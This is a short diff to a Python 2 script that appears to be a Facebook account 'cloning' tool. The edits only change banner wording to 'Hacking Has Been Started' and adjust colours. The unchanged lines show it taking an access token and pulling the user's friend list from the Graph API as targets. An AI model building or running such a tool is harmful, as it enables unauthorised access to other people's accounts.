@@ -377,7 +377,7 @@ def pilih_super():
 		os.system('clear')
 		print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
 		print logo
-		jalan('\033[1;97m[+]\033[1;47m\033[1;91mGetting Accounts\033[1;91m...\033[1;0m')
+		jalan('\033[1;97m[+]\033[1;91mGetting Accounts\033[1;97m:-:')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -409,7 +409,7 @@ def pilih_super():
 	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97m[+]\033[1;47m\033[1;31mCloning Has Been Started\033[1;0m\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
+		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
 	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
 	print "\033[1;97m•-----------------\033[1;37mKali.linux\033[1;97m-----------------•"
  	
